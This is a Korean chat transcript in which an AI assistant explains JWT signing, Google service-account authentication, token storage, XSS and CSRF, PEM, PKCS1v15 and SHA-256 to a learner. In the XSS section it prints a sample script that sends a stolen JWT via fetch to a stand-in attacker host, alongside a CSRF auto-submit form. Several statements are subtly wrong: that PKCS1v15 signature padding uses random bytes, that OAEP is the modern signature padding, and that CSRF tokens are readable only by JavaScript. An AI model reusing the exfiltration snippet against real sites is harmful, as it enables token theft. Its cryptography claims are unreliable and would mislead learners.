JWT 서명
        ↓
Google OAuth2 서버에 Access Token 교환 요청
        ↓
Access Token으로 TTS API 호출
```

### 사용자 로그인
```
사용자가 아이디/비밀번호 입력
        ↓ DB에서 비밀번호 검증
JWT 서명 (우리 서버의 secret key로)
        ↓
클라이언트에게 JWT 발급
        ↓
이후 요청마다 JWT 첨부 → 우리 서버가 검증
```

---

## 핵심 차이

```
서버 간 통신:  키가 처음부터 있음 → 바로 JWT 서명
                                    → 상대 서버(Google)가 검증

사용자 로그인: 비밀번호 먼저 확인 → JWT 서명 후 클라이언트에 발급
                                    → 우리 서버가 검증
```

JWT 기술 자체는 동일하고, **"누가 서명하고 누가 검증하느냐"** 와 **"신원을 어떻게 확인하느냐"** 만 다릅니다.

```

```
[USER]
사용자 로그인 JWT 는 secret key 를 어떻게 만들어?

[ASSISTANT]
## 사용자 로그인 JWT의 secret key

서버 간 통신과 달리, **우리가 직접 만듭니다.**

---

## 만드는 방법

### 방법 1 — 랜덤 문자열 (가장 흔함, HMAC 방식)

```bash
# 터미널에서 랜덤 생성
openssl rand -base64 32
# 결과: K7gNU3sdo+OL0wNhqoVWhr5v6s1xm4aBDnJFp6VK2E=
```

이걸 `.env` 파일에 저장합니다:

```
JWT_SECRET=K7gNU3sdo+OL0wNhqoVWhr5v6s1xm4aBDnJFp6VK2E=
```

Spring Boot에서 사용:

```java
@Value("${jwt.secret}")
private String secretKey;

// 서명
Jwts.builder()
    .subject(userId)
    .signWith(Keys.hmacShaKeyFor(secretKey.getBytes()))
    .compact();
```
---

### 방법 2 — RSA key pair 생성 (더 안전)

```bash
# private key 생성
openssl genrsa -out private.pem 2048

# public key 추출
openssl rsa -in private.pem -pubout -out public.pem
```

```
private.pem  →  서버가 JWT 서명할 때 사용
public.pem   →  JWT 검증할 때 사용 (외부에 공개 가능)
```

---

## 두 방식 비교

| | **HMAC + 랜덤 문자열** | **RSA key pair** |
|---|---|---|
| 서명 키 | secret key 하나 | private key |
| 검증 키 | secret key 하나 (동일) | public key (별도) |
| 키 관리 | 단순 | 복잡 |
| 사용처 | 단일 서버 | 여러 서버, 외부 공개 |
| 알고리즘 | HS256 | RS256 (이 코드와 동일) |

---

## 핵심

```
서버 간 통신 (이 코드):  Google이 key pair 발급 → JSON 파일로 줌
사용자 로그인:           우리가 직접 생성 → .env 파일에 보관
```

secret key는 **절대 외부에 노출되면 안 됩니다.** 누구든 이 키가 있으면 유효한 JWT를 마음대로 만들 수 있기 때문입니다.

```

```
[USER]
[Server]자체적으로 만든 Private key, Public key 생성. 모든 사용사 적용 > [Client] ID, Password > [Server] ID, Password 검증 > [Server]서버의 Private Key 로 JWT 서명 > [Client] 필요한 기능 호출(with JWT 서명) > [Server] 요청 기능 수락 전에 받은 JWT 서명을
자체적올 만든 Public Key 로 검증 후 서버스 제공 => 맞어?

[ASSISTANT]
네, 완벽하게 맞습니다.

그림으로 정리하면:

```
[Server] 사전 준비
private key + public key 생성 (최초 1회)
─────────────────────────────────────────

[Client]                        [Server]
    │                               │
    │── ID, Password ──────────────▶│
    │                               │ DB에서 검증
    │                               │ ✅ 일치
    │                               │ private key로 JWT 서명
    │◀── JWT 발급 ──────────────────│
    │                               │
    │                               │
    │── 기능 요청 (JWT 첨부) ────────▶│
    │                               │ public key로 JWT 검증
    │                               │ ✅ 유효
    │◀── 서비스 응답 ───────────────│
    │                               │
    │── 기능 요청 (JWT 첨부) ────────▶│
    │                               │ public key로 JWT 검증
    │                               │ ✅ 유효
    │◀── 서비스 응답 ───────────────│
```

---

한 가지 추가하면:

```
로그인 이후 요청부터는
ID/Password 검증 없이
JWT 검증만으로 서비스 제공

→ DB 조회 없음
→ 빠름
→ 이것이 JWT의 핵심 장점
```

JWT가 만료(`exp`)되면 클라이언트는 다시 ID/Password로 로그인해서 새 JWT를 받아야 합니다.

```

```
[USER]
그러면 이 방식은 Access Token 필요 없이 AWT 서명으로 검증하는거네. 맞어?

[ASSISTANT]
네, 맞습니다.

정확히 말하면 **JWT 자체가 Access Token** 입니다.

---

## 용어 정리

```
사용자 로그인 방식:

JWT = Access Token
      (둘이 별개가 아님)

로그인 성공 → JWT 발급 → 이게 곧 Access Token
```

---

## 이 프로젝트 코드(Google)와 비교하면 혼란스러운 이유

```
Google 서버 간 통신:
JWT 서명 ──▶ Google OAuth2 서버에 제출
              ↓
         Access Token 별도 발급
              ↓
         Access Token으로 TTS API 호출

→ JWT와 Access Token이 별개


사용자 로그인:
ID/Password 검증
              ↓
         JWT 발급
              ↓
         JWT로 바로 API 호출

→ JWT가 곧 Access Token
```

---

## 왜 Google은 JWT와 Access Token을 분리했나

Google API는 **수많은 외부 서버**가 호출합니다. Access Token을 별도로 발급해서 수명을 짧게(1시간) 관리하면 보안 통제가 쉽기 때문입니다.

자체 서버에서는 그럴 필요 없이 JWT 하나로 끝내는 것이 더 단순합니다.

```

```
[USER]
그러면 사용자 로그인 방식의 JWT 서명도 유효시간 있는지?

[ASSISTANT]
네, 있습니다.

Payload의 `exp` 필드가 유효시간입니다.

```python
# JWT 발급 시
payload = {
    'sub': 'user123',        # 사용자 ID
    'exp': now + 3600,       # 1시간 후 만료
    'iat': now               # 발급 시각
}
```

---

## 만료되면?

```
[Client]                        [Server]
    │                               │
    │── 기능 요청 (만료된 JWT) ──────▶│
    │                               │ public key로 검증
    │                               │ exp 확인 → 만료됨 ❌
    │◀── 401 Unauthorized ──────────│
    │                               │
    │── ID/Password 재로그인 ────────▶│
    │                               │ 검증 후 새 JWT 발급
    │◀── 새 JWT ────────────────────│
```

---

## 유효시간을 짧게 vs 길게

| | **짧게 (1시간)** | **길게 (30일)** |
|---|---|---|
| 보안 | 토큰 탈취 피해 최소화 | 탈취 시 오래 위험 |
| 불편함 | 자주 재로그인 | 재로그인 거의 없음 |
| 사용처 | 금융, 보안 중요 서비스 | 일반 앱, 쇼핑몰 |

---
## 실무에서 많이 쓰는 패턴

재로그인 불편함을 줄이기 위해 **두 가지 토큰을 함께 발급**합니다.

```
Access Token  → 유효시간 짧음 (1시간) — API 호출에 사용
Refresh Token → 유효시간 김 (30일)  — Access Token 재발급에만 사용

Access Token 만료
        ↓
Refresh Token으로 새 Access Token 자동 발급
        ↓
사용자는 재로그인 없이 계속 사용
```
```

```
[USER]
사용자 로그인은 왜 sub 에서 사용자 계정이 들어가지?

[ASSISTANT]
## `sub` (Subject) 에 사용자 계정이 들어가는 이유

JWT는 **"이 토큰의 주인이 누구냐"** 를 표현해야 합니다.

---

## `iss` vs `sub` 차이

```
iss (Issuer)  = 토큰을 발급한 주체  → 서버
sub (Subject) = 토큰의 주인        → 사용자
```

예시:

```json
{
    "iss": "voicebot-server",   ← 이 토큰을 만든 건 voicebot 서버
    "sub": "user123",           ← 이 토큰의 주인은 user123
    "exp": 1750000000
}
```

---

## 왜 `sub`에 넣어야 하나

서버가 JWT를 검증한 뒤 **"이 요청이 누구의 요청인지"** 알아야 서비스를 제공할 수 있기 때문입니다.

```
[Client] 김철수가 로그인
        ↓
[Server] sub: "user123" 담아서 JWT 발급
        ↓
[Client] 내 정보 조회 요청 (JWT 첨부)
        ↓
[Server] JWT 검증
        ↓ sub 꺼냄
        ↓ "user123" 의 정보를 DB에서 조회
        ↓
[Client] 김철수 정보 반환
```

`sub` 없이는 JWT가 유효해도 **누구의 요청인지 알 수 없습니다.**

---

## 서버 간 통신에 `sub`가 없는 이유

```
서버 간 통신:  iss 만으로 충분
               "voicebot 서버가 요청했다" → 신원 하나뿐

사용자 로그인: sub 가 필수
               "voicebot 서버가 발급한, user123의 토큰" → 신원 두 개
               (발급자 + 사용자)
```

한 줄 요약:

> 서버가 JWT 검증 후 **어떤 사용자의 요청인지 식별**하기 위해 `sub`에 사용자 계정을 담습니다.

```

```
[USER]
그래서 사용자별로 JWT 서명이 다르겠네. 지문(SHA-256) 다를테니.

[ASSISTANT]
네, 정확합니다.

`sub`가 다르면 Payload가 다르고, Payload가 다르면 SHA-256 지문이 다르고, 지문이 다르면 Signature가 달라집니다.

```
김철수 JWT:
Payload = { "sub": "user123", "exp": 1750000000 }
        ↓ SHA-256
지문 = a1b2c3d4...
        ↓ private key 서명
Signature = xK9mP2...


이영희 JWT:
Payload = { "sub": "user456", "exp": 1750000000 }
        ↓ SHA-256
지문 = 9f8e7d6c...   ← sub 하나 달라졌을 뿐인데 완전히 다름
        ↓ private key 서명
Signature = qR7nL4...
```

---

## 여기서 SHA-256 눈사태 효과가 발휘됩니다

```
"user123"  →  SHA-256  →  a1b2c3d4e5f6...
"user124"  →  SHA-256  →  9f3k2m8p1q7r...
                           ↑
                    딱 한 글자 차이인데
                    결과가 완전히 달라짐
```

이 특성 덕분에:

```
공격자가 JWT의 sub를 user123 → user456 으로 변조 시도
        ↓
Payload가 바뀌면 지문이 바뀜
        ↓
원래 Signature와 불일치 ❌
        ↓
서버가 위조 감지
```

> Signature가 사용자마다 다르기 때문에, 다른 사람의 토큰을 자기 것처럼 쓰거나 내용을 바꾸는 것이 불가능합니다.

```


```
[USER]
그러면 사용자별로 JWT 서명은 다르지만 DB 에 저장하지 않고 메모리에 갖고 있나? 왜냐하면 1시간이면 없어질테니까.

[ASSISTANT]
아닙니다. **서버는 JWT를 저장하지 않습니다.** 메모리에도 없습니다.

---

## JWT의 핵심 설계 원칙 — 무상태(Stateless)

```
발급한 JWT를 서버가 기억하지 않는다.
검증에 필요한 모든 정보가 JWT 안에 이미 들어있다.
```

---

## 그러면 어디에 있나

```
[Server] JWT 발급
        ↓ 클라이언트에게 전달 후 서버는 잊어버림
[Client] JWT 보관 (브라우저 localStorage 또는 쿠키)
        ↓ 요청마다 JWT 첨부해서 서버로 보냄
[Server] 받은 JWT를 그 자리에서 검증
        ↓ public key + exp 확인만 하면 됨
        ↓ 유효하면 서비스 제공
        ↓ 검증 끝나면 또 잊어버림
```

---

## 검증에 DB가 필요 없는 이유

```
JWT 안에 이미 다 있음:
    sub → 누구인지
    exp → 유효한지
    Signature → 위조됐는지

→ DB 조회 없이 public key 하나로 모든 것 검증 가능
```

---

## 세션 방식과 비교

```
세션 방식:                      JWT 방식:
서버가 세션 저장 (DB/메모리)     서버는 아무것도 저장 안 함
        ↓                               ↓
클라이언트가 세션ID 전달         클라이언트가 JWT 전달
        ↓                               ↓
서버가 DB에서 세션 조회          서버가 JWT 자체를 검증
(DB 조회 발생)                   (DB 조회 없음)
```

> JWT가 빠른 이유가 바로 이것입니다. 서버는 발급과 검증만 할 뿐, 아무것도 저장하지 않습니다.

```

```
[USER]
클라이언트가 JWT 를 localStorage 에 저장하면 보안 문제 없어?

[ASSISTANT]
있습니다. localStorage는 보안상 취약합니다.

---

## localStorage의 문제 — XSS 공격

```
공격자가 악성 스크립트를 웹페이지에 심으면
JavaScript로 localStorage에 접근 가능

document.cookie       → 쿠키는 httpOnly 설정 시 접근 불가
localStorage.getItem('jwt')  → 무조건 접근 가능 ❌
```

---

## 저장 방식별 비교

| | **localStorage** | **쿠키 (httpOnly)** | **메모리 (변수)** |
|---|---|---|---|
| XSS 공격 | 취약 ❌ | 안전 ✅ | 안전 ✅ |
| CSRF 공격 | 안전 ✅ | 취약 ❌ | 안전 ✅ |
| 브라우저 종료 시 | 유지 | 유지 | 사라짐 |
| 구현 난이도 | 쉬움 | 보통 | 보통 |

---

## XSS vs CSRF

```
XSS (Cross Site Scripting):
공격자 스크립트 → localStorage JWT 탈취
→ localStorage는 취약, httpOnly 쿠키는 안전

CSRF (Cross Site Request Forgery):
다른 사이트에서 사용자 몰래 요청 전송
→ 쿠키는 자동 첨부되어 취약, localStorage는 안전
```

---
## 실무에서 많이 쓰는 방식

```
Access Token  → 메모리(변수)에 보관 (탈취 어려움, 브라우저 종료 시 사라짐)
Refresh Token → httpOnly 쿠키에 보관 (JavaScript 접근 불가)

Access Token 만료
        ↓
Refresh Token으로 서버에 재발급 요청
        ↓ (쿠키는 자동 첨부)
새 Access Token 메모리에 저장
        ↓
사용자는 재로그인 없이 계속 사용
```

---

## 한 줄 요약

> localStorage는 편하지만 XSS에 취약합니다. 보안이 중요한 서비스라면 **Access Token은 메모리, Refresh Token은 httpOnly 쿠키**에 보관하는 것이 실무 권장 방식입니다.

```

```
[USER]
httpOnly 쿠키는 CSRF 어떻게 방어해? CSRF, XSS 무엇인지 부터 설명해줘.

[ASSISTANT]
## XSS (Cross Site Scripting)

**"내 사이트에 악성 스크립트를 심는 공격"**

```
공격자가 댓글에 악성 스크립트 작성:
<script>
    var jwt = localStorage.getItem('token');
    fetch('https://공격자서버.com?jwt=' + jwt);  // JWT 탈취
</script>

피해자가 그 댓글 페이지 방문
        ↓
브라우저가 스크립트 실행
        ↓
JWT가 공격자 서버로 전송 ❌
```

핵심: **내 사이트 안에서** 악성 코드가 실행됩니다.

---

## CSRF (Cross Site Request Forgery)

**"다른 사이트에서 내 사이트로 몰래 요청을 보내는 공격"**

```
피해자가 voicebot.com 에 로그인 중 (쿠키 보유)

공격자가 악성 사이트 링크를 이메일로 전송
피해자가 클릭 → 악성 사이트 방문

악성 사이트 코드:
<form action="https://voicebot.com/transfer" method="POST">
    <input name="amount" value="100만원">
</form>
<script>document.forms[0].submit()</script>

        ↓
브라우저가 voicebot.com 으로 요청 전송
쿠키는 자동으로 첨부 ❌
        ↓
서버는 정상 요청으로 착각
```

핵심: **다른 사이트에서** 피해자 몰래 요청이 발생합니다.

---
## 둘의 차이

```
XSS:  내 사이트 안에서 악성 스크립트 실행 → 데이터 탈취
CSRF: 다른 사이트에서 내 사이트로 요청   → 몰래 행동 실행
```

---

## httpOnly 쿠키의 CSRF 방어 방법

httpOnly 쿠키 자체는 CSRF를 막지 못합니다. 별도 방어가 필요합니다.

### CSRF Token 방식 (가장 흔함)

```
[Server] 페이지 요청 시 CSRF Token 발급
        ↓ HTML에 숨겨서 전달
[Client] 폼 전송 시 CSRF Token 함께 전송

<input type="hidden" name="csrf_token" value="aB3xK9mP">

[Server] 쿠키의 JWT + CSRF Token 둘 다 검증
        ↓
CSRF Token은 JavaScript로만 읽을 수 있음
        ↓
악성 사이트는 CSRF Token을 모름 → 요청 차단 ✅
```

---

## 왜 CSRF Token이 효과적인가

```
악성 사이트가 voicebot.com 으로 요청 시:
    쿠키     → 브라우저가 자동 첨부 (막을 수 없음)
    CSRF Token → 악성 사이트가 알 수 없음 ❌

서버가 CSRF Token 없는 요청 거부
        ↓
CSRF 공격 차단 ✅
```

---

## 정리

| 공격 | 방어 |
|---|---|
| XSS | httpOnly 쿠키 (JavaScript 접근 차단) |
| CSRF | CSRF Token (악성 사이트가 모르는 값 요구) |

> XSS와 CSRF는 서로 다른 경로의 공격이라 방어 방법도 다릅니다. 둘 다 막으려면 **httpOnly 쿠키 + CSRF Token** 을 함께 써야 합니다.

```

```
● load_pem_private_key()

  Python cryptography 라이브러리의 함수입니다.

  ---
  PEM이 뭔가부터

  PEM은 개인키를 텍스트로 저장하는 형식입니다.

  -----BEGIN RSA PRIVATE KEY-----
  MIIEowIBAAKCAQEA2a2rwplBQLF29amygykEMmYz0+Kcj3bKBp29Ag9gdHoP
  mBDCFMKG3lMJBTMBUZpHWi7HgMgFCBMBLFZpZXm4gFCBMBLFZpZXm4...
  -----END RSA PRIVATE KEY-----

  실제로는 바이너리 데이터인데, 이메일/파일로 주고받기 편하게 Base64 텍스트로 감싼 것입니다.

  ---
  load_pem_private_key()가 하는 일

  "-----BEGIN RSA PRIVATE KEY-----\nMIIE..."  ← JSON 파일 안의 문자열
                      ↓
            load_pem_private_key()
                      ↓
           RSAPrivateKey 객체        ← 서명 연산에 쓸 수 있는 형태

  텍스트 → 암호화 연산 가능한 객체로 변환하는 것입니다.

  책에 비유하면:

  PDF로 저장된 악보      →  load_pem_private_key()  →  피아니스트가 연주 가능한 악보
  (텍스트, 읽기만 가능)                               (객체, 연산 가능)

  ---
  변환 후 무엇이 달라지나

  # 변환 전 — 그냥 문자열, 아무것도 못함
  creds['private_key']  # "-----BEGIN RSA PRIVATE KEY-----\n..."

  # 변환 후 — 서명 연산 가능
  private_key.sign(data, padding.PKCS1v15(), hashes.SHA256())

  이 코드에서는 변환된 객체로 JWT에 서명하는 것이 목적입니다.

✻ Churned for 14s

❯ PEM 단어 풀이와 의미 알려줘. 왜 필요하고 비교할 만한 것과 비교해줘.

● PEM

  Privacy Enhanced Mail — 직역하면 "개인정보 보호 메일"

  ---
  탄생 배경

  1990년대 이메일로 암호화 키를 주고받아야 했는데, 키는 원래 바이너리(이진 데이터) 입니다.

  바이너리:  00 01 FF 3A 00 02 AB ...  ← 이메일로 보내면 깨짐

  이메일은 텍스트만 안전하게 전송할 수 있었기 때문에, 바이너리를 Base64 텍스트로 변환해서 주고받는 형식을 만든 것이 PEM입니다.

  ---
  PEM 생김새

  -----BEGIN RSA PRIVATE KEY-----   ← 시작 표시 (무슨 데이터인지)
  MIIEowIBAAKCAQEA2a2rwplBQLzm
  kBDCFMKG3lMJBTMBUZpHWi7HgMg    ← 바이너리를 Base64로 인코딩한 텍스트
  FMBLFZpZXm4gFCBMBLFZpZXm4...
  -----END RSA PRIVATE KEY-----    ← 끝 표시

  구조는 단순합니다:
  시작줄  +  Base64(바이너리 데이터)  +  끝줄

  ---
  왜 지금도 쓰나

  이메일 시대는 지났지만 텍스트로 다루기 편하다는 장점이 그대로 유효합니다.

  # 파일로 저장 가능
  cat private_key.pem

  # 복사/붙여넣기 가능
  # JSON 파일 안에 문자열로 포함 가능  ← 이 프로젝트가 이 경우
  {
    "private_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIE..."
  }

  ---
  비교

  ┌──────────────────┬─────────────────────────────────────────┬────────────────────────┬─────────────────┐
  │                  │                   PEM                   │          DER           │       JWK       │
  ├──────────────────┼─────────────────────────────────────────┼────────────────────────┼─────────────────┤
  │ 형식             │ Base64 텍스트                           │ 바이너리               │ JSON            │
  ├──────────────────┼─────────────────────────────────────────┼────────────────────────┼─────────────────┤
  │ 확장자           │ .pem, .key, .crt                        │ .der, .cer             │ .json           │
  ├──────────────────┼─────────────────────────────────────────┼────────────────────────┼─────────────────┤
  │ 눈으로 읽기      │ 가능 (Base64)                           │ 불가                   │ 가능            │
  ├──────────────────┼─────────────────────────────────────────┼────────────────────────┼─────────────────┤
  │ 파일/이메일 전송 │ 편함                                    │ 불편                   │ 편함            │
  ├──────────────────┼─────────────────────────────────────────┼────────────────────────┼─────────────────┤
  │ 주요 사용처      │ Linux 서버, OpenSSL, Google 서비스 계정 │ Windows, Java KeyStore │ JWT, OAuth2 API │
  └──────────────────┴─────────────────────────────────────────┴────────────────────────┴─────────────────┘

  ---
  한 줄 요약

  ▎ 바이너리 키를 텍스트 파일로 저장하고 주고받기 위한 포장 형식.
  ▎ 내용물(실제 키)은 같고, 포장지만 다른 것입니다.

✻ Crunched for 14s

❯ "padding.PKCS1v15(),  # RSA 패딩 방식" 대해서 쉽게 말해줘.

● 패딩(Padding)이란?

  먼저 패딩부터.

  RSA는 딱 정해진 크기의 데이터만 서명할 수 있습니다. 데이터가 그 크기보다 작으면 빈 공간이 생깁니다.

  RSA가 처리할 수 있는 블록 크기: 256 bytes
  실제 서명할 데이터:              20 bytes

  ┌─────────────────────────────────────┐
  │  실제 데이터 (20 bytes)              │  빈 공간 (236 bytes) 어떻게?
  └─────────────────────────────────────┘

  이 빈 공간을 어떻게 채울지가 패딩 방식입니다.

  ---
  PKCS1v15가 채우는 방법

  ┌────┬──────────────────────────┬────┬──────────────┐
  │ 00 │  랜덤 바이트들 (FF FF..) │ 00 │  실제 데이터  │
  └────┴──────────────────────────┴────┴──────────────┘
    고정         빈 공간 채우기      구분    서명할 데이터

  규칙이 정해져 있어서 Google 서버가 받았을 때 어디서 실제 데이터가 시작하는지 알 수 있습니다.

  ---
  왜 그냥 0으로 채우면 안 되나?

  ┌────┬──────────────────────────┬──────────────┐
  │ 00 │  0000000000000000000000  │  실제 데이터  │
  └────┴──────────────────────────┴──────────────┘

  0으로만 채우면 공격자가 패턴을 예측할 수 있어서 위조가 쉬워집니다. 랜덤 바이트로 채워야 예측이 불가능합니다.

  ---
  PKCS1v15 vs OAEP (현재 권장)

  ┌────────┬────────────────┬──────────────────┐
  │        │    PKCS1v15    │       OAEP       │
  ├────────┼────────────────┼──────────────────┤
  │ 출시   │ 1993년         │ 1998년           │
  ├────────┼────────────────┼──────────────────┤
  │ 보안   │ 취약점 발견됨  │ 더 안전          │
  ├────────┼────────────────┼──────────────────┤
  │ 사용처 │ 레거시, 호환성 │ 신규 시스템 권장 │
  └────────┴────────────────┴──────────────────┘

  이 코드에서 PKCS1v15를 쓰는 이유는 Google OAuth2 서버가 이 방식을 요구하기 때문입니다. 선택의 여지가 없습니다.

  ---
  한 줄 요약

  ▎ RSA 서명 시 데이터 크기를 맞추기 위해 빈 공간을 예측 불가능한 랜덤값으로 채우는 규칙입니다.

✻ Baked for 20s

❯ hashes.SHA256() 도 설명해줘

● hashes.SHA256()

  SHA-256 = Secure Hash Algorithm 256-bit

  ---
  해시(Hash)란?

  어떤 데이터든 고정 크기의 문자열로 변환하는 함수입니다.

  "안녕하세요"        →  SHA-256  →  a1b2c3d4e5f6... (64자리 고정)
  "안녕하세요!"       →  SHA-256  →  9f8e7d6c5b4a... (64자리 고정)
  "War and Peace" (대용량 소설)  →  SHA-256  →  3c4d5e6f7a8b... (64자리 고정)

  특징 3가지:
  ① 입력이 조금만 달라도 결과가 완전히 달라짐 (눈사태 효과)
  ② 결과로 원본을 역추적 불가능
  ③ 같은 입력 → 항상 같은 결과

  ---
  이 코드에서 왜 쓰나

  JWT 서명할 때 데이터 전체를 RSA로 암호화하면 너무 느립니다.

  Header.Payload 전체 (수백 bytes)
          ↓  SHA-256
     고정 32 bytes 지문
          ↓  RSA 서명
        훨씬 빠름

  순서:
  서명할 데이터 (Header.Payload)
          ↓ SHA-256 해시
     32 bytes 지문 생성
          ↓ RSA private_key로 암호화
        Signature 완성

  Google 서버에서 검증할 때:
  받은 Header.Payload
          ↓ SHA-256 해시
     32 bytes 지문 생성
          ↓ 보내온 Signature와 비교
        일치하면 위조 없음 ✅

  ---
  SHA 계열 비교

  ┌───────────┬────────────────┬──────────────────┬──────────────────┐
  │           │     SHA-1      │     SHA-256      │     SHA-512      │
  ├───────────┼────────────────┼──────────────────┼──────────────────┤
  │ 출력 크기 │ 160 bit (40자) │ 256 bit (64자)   │ 512 bit (128자)  │
  ├───────────┼────────────────┼──────────────────┼──────────────────┤
  │ 보안      │ 취약점 발견 ❌ │ 현재 표준 ✅     │ 더 강력하나 느림 │
  ├───────────┼────────────────┼──────────────────┼──────────────────┤
  │ 사용처    │ 레거시         │ JWT, TLS, 대부분 │ 고보안 요구 시   │
  └───────────┴────────────────┴──────────────────┴──────────────────┘

  ---
  PKCS1v15와 SHA-256의 관계

  private_key.sign(
      signing_input,       # 서명할 데이터
      padding.PKCS1v15(),  # 빈 공간 채우는 방식
      hashes.SHA256()      # 데이터를 32bytes로 압축하는 방식
  )

  둘은 역할이 다릅니다.

  SHA-256    → 데이터를 32bytes 지문으로 압축
  PKCS1v15   → 그 지문을 RSA 블록 크기에 맞게 패딩

  한 줄 요약

  ▎ 데이터를 고정 크기 지문으로 변환하는 함수. 위조 감지와 성능 향상을 위해 RSA 서명 전에 먼저 적용합니다.

✻ Crunched for 16s

❯ 32 bytes 지문 생성 => 64자리라면서 왜 32bytes 인지?

● 좋은 질문입니다.

  ---
  32 bytes = 64자리 이유

  SHA-256의 출력은 256 bit 입니다.

  256 bit ÷ 8 = 32 bytes        (컴퓨터 내부 저장 단위)
  32 bytes × 2 = 64자리         (사람이 읽는 16진수 표현)

  ---
  왜 1 byte가 16진수 2자리인가

  1 byte = 8 bit = 0~255 범위

  255를 16진수로 표현하면 FF — 두 자리가 필요합니다.

  1 byte  →  FF  (16진수 2자리)
  32 bytes →  64자리

  예시:
  byte 값: 255  →  16진수: FF
  byte 값: 10   →  16진수: 0A
  byte 값: 172  →  16진수: AC

  ---
  실제 SHA-256 결과

  "안녕하세요" → SHA-256

  내부 저장 (32 bytes):
  [a1][b2][c3][d4][e5][f6]...(32개)

  화면 출력 (64자리 16진수):
  a1b2c3d4e5f6... (64자리)

  ---
  한 줄 요약

  ▎ 32 bytes와 64자리는 같은 데이터를 다르게 표현한 것입니다.
  ▎ 32 bytes = 컴퓨터 저장 단위, 64자리 = 사람이 읽는 16진수 표현.

✻ Cooked for 8s

❯ 서명할 데이터 (Header.Payload) 은 signing_input = header + b'.' + payload 말하는거지?

● 네, 맞습니다.

  signing_input = header + b'.' + payload

  이게 바로 서명할 데이터입니다. 실제로 어떻게 생겼는지 보면:

  header  = b'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9'
  payload = b'eyJpc3MiOiJ2b2ljZWJvdEBxeHguaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCAic2NvcGUiOi4uLn0'

  signing_input = header + b'.' + payload
  # 결과:
  # eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ2b2ljZWJvdEBxeHguaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCAic2NvcGUiOi4uLn0

  그리고 이걸 서명해서 Signature를 만들고, 마지막에 셋을 합칩니다:

  # 서명
  signature = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())

  # 최종 JWT 완성
  jwt = signing_input + b'.' + signature
  #     ↑               ↑      ↑
  #   Header.Payload    .    Signature

  즉 JWT 완성까지 .이 두 번 찍힙니다:

  eyJhbGci...   .   eyJpc3Mi...   .   xyzABC...
     Header      .    Payload      .   Signature

✻ Cogitated for 8s

❯ 받은 Header.Payload 은 header 부분과 Payload 부분을 합쳐서 지문(SHA-256) 변환하고 signature 와 비교해서 같으면 검증이 된거다. 맞어?

● 네, 정확합니다.

  검증 흐름을 그림으로 보면:

  Google 서버가 JWT를 받았을 때

  받은 JWT:
  eyJhbGci....  .  eyJpc3Mi....  .  xyzABC...
     Header     .    Payload     .  Signature
        │                              │
        └──────────┐                  │
                   ▼                  │
           SHA-256 해시               │
                   ↓                  │
              32 bytes 지문           │
                   │                  │
                   ▼                  ▼
                비교 ◀───────── Signature 복호화
                   │           (Google이 가진
                   │            public_key로)
          ┌────────┴────────┐
          ↓                 ↓
        일치 ✅           불일치 ❌
     토큰 유효          위조된 토큰

  한 가지만 추가하면, Signature를 비교할 때 Google 서버는 public_key로 Signature를 복호화해서 지문을 꺼낸 뒤 비교합니다.

  우리가 서명할 때   →  private_key로 암호화
  Google이 검증할 때 →  public_key로 복호화 → Header.Payload 해시와 비교

  private_key로 암호화한 것은 반드시 쌍을 이루는 public_key로만 복호화됩니다. Google은 우리 서비스 계정의 public_key를 이미 알고 있어서 검증이 가능한 구조입니다.

✻ Brewed for 9s

❯ 보여준 구조도를 보면 Header 만 지문(SHA-256)인 것 같은데 Header + Payload 맞지 않어?
    받은 JWT:
    eyJhbGci....  .  eyJpc3Mi....  .  xyzABC...
       Header     .    Payload     .  Signature
          │                              │
          └──────────┐                  │
                     ▼                  │
             SHA-256 해시               │
                     ↓                  │
                32 bytes 지문           │
                     │                  │
                     ▼                  ▼
                  비교 ◀───────── Signature 복호화
                     │           (Google이 가진
                     │            public_key로)
            ┌────────┴────────┐
            ↓                 ↓
          일치 ✅           불일치 ❌
       토큰 유효          위조된 토큰


● 맞습니다. 제 그림이 잘못됐습니다. Header 화살표만 그려서 오해를 줬네요.

  올바른 그림:

  받은 JWT:
  eyJhbGci....  .  eyJpc3Mi....  .  xyzABC...
     Header     .    Payload     .  Signature
        │                │              │
        └────────┬────────┘             │
                 ▼                      │
         SHA-256 해시                   │
         (Header + "." + Payload)       │
                 ↓                      │
            32 bytes 지문               │
                 │                      │
                 ▼                      ▼
              비교 ◀───────── Signature 복호화
                 │           (Google이 가진
                 │            public_key로)
        ┌────────┴────────┐
        ↓                 ↓
      일치 ✅           불일치 ❌
   토큰 유효          위조된 토큰

  Header와 Payload 둘 다 화살표가 합쳐져서 SHA-256으로 들어가는 게 맞습니다.

✻ Crunched for 4s

❯ public_key 는 어디서 오는거야?

● public_key는 어디서 오나

  서비스 계정 JSON 파일을 Google이 발급할 때, private_key와 public_key 쌍을 같이 만듭니다.

  Google Cloud Console에서 서비스 계정 키 생성
                  ↓
  Google가 key pair 생성
      ├── private_key  →  JSON 파일에 담아서 우리한테 줌
      └── public_key   →  Google 서버에 보관

  ---
  흐름

  우리                              Google 서버
   │                                    │
   │  서비스 계정 키 생성 요청            │
   │ ─────────────────────────────────▶ │
   │                                    │ private_key + public_key 생성
   │  JSON 파일 (private_key 포함) 받음  │ public_key는 Google 서버에 저장
   │ ◀───────────────────────────────── │
   │                                    │
   │  JWT 서명 (private_key 사용)        │
   │ ─────────────────────────────────▶ │ 보관 중인 public_key로 검증
   │                                    │

  ---
  핵심

  우리가 public_key를 따로 전달할 필요가 없습니다.

  Google이 키를 발급할 때 이미 public_key를 자기 서버에 저장해뒀기 때문입니다. JWT를 받으면 private_key_id 필드로 어떤 키 쌍인지 찾아서 검증합니다.

  {
    "private_key_id": "abc123",   ← 이걸로 Google이 어떤 public_key 쓸지 찾음
    "private_key": "-----BEGIN RSA PRIVATE KEY-----..."
  }

✻ Cogitated for 10s

※ recap: Google 서비스 계정 JSON의 private_key로 JWT를 직접 서명해 Access Token을 발급받는 E2E 테스트 코드를 분석 중이었습니다. JWT
  구조(Header.Payload.Signature)와 서명/검증 흐름 설명이 완료된 상태입니다.

❯ 위 설명에서 보면 '사용자 로그인 토큰' 있는데 JWT 처리과정이 '서버 간 통신', ' 사용자 로그인 토큰' 나눠지는 것이고 처리 준비나 과정이 다른지?
    서버 간 통신 (이 코드처럼)     →  iss, aud, exp, iat
